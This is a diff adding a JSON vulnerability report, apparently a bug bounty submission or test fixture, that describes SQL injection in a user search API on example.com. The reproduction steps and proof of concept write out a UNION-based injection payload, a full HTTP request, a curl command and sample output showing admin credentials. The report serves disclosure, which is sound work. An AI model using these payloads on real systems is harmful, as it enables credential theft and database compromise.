@@ -1,0 +1,28 @@
+{
+  "title": "SQL Injection in User Search Endpoint with Authentication Bypass",
+  "researcher": "security_researcher_pro",
+  "submission_date": "2025-10-12",
+  "vulnerability_type": "SQL Injection",
+  "severity": "Critical",
+  "severity_justification": "Allows complete database access and authentication bypass",
+  "affected_components": [
+    "/api/v1/users/search",
+    "UserController.searchUsers()",
+    "database/queries.py"
+  ],
+  "reproduction_steps": [
+    "1. Navigate to the user search endpoint at https://example.com/api/v1/users/search",
+    "2. Send a POST request with the following payload in the 'query' parameter",
+    "3. Inject SQL payload: ' OR '1'='1' UNION SELECT username, password, email FROM admin_users--",
+    "4. Observe that the response contains admin user credentials",
+    "5. The application does not properly sanitize user input before constructing SQL queries"
+  ],
+  "proof_of_concept": "POST /api/v1/users/search HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\n{\"query\": \"' OR '1'='1' UNION SELECT username, password, email FROM admin_users--\", \"limit\": 100}\n\nAlternatively, using curl:\n\ncurl -X POST https://example.com/api/v1/users/search \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' \\\n  -d '{\"query\": \"'\\'' OR '\\''1'\\''='\\''1'\\'' UNION SELECT username, password, email FROM admin_users--\", \"limit\": 100}'\n\nThe response will contain:\n{\n  \"users\": [\n    {\"username\": \"admin\", \"password\": \"$2b$12$hashed_password\", \"email\": \"admin@example.com\"},\n    {\"username\": \"superadmin\", \"password\": \"$2b$12$another_hash\", \"email\": \"super@example.com\"}\n  ]\n}",
+  "impact_description": "This SQL injection vulnerability allows an attacker to:\n\n1. Extract sensitive data from the database including user credentials, personal information, and admin accounts\n2. Bypass authentication mechanisms by manipulating SQL queries\n3. Potentially modify or delete database records\n4. Escalate privileges by accessing admin accounts\n5. Compromise the entire application and its data\n\nThe vulnerability exists because user input is directly concatenated into SQL queries without proper parameterization or input validation. The affected endpoint is accessible to authenticated users, making it easy to exploit.",
+  "attachments": [
+    "screenshot_sql_injection.png",
+    "burp_suite_request.xml",
+    "database_dump.txt"
+  ]
+}
+
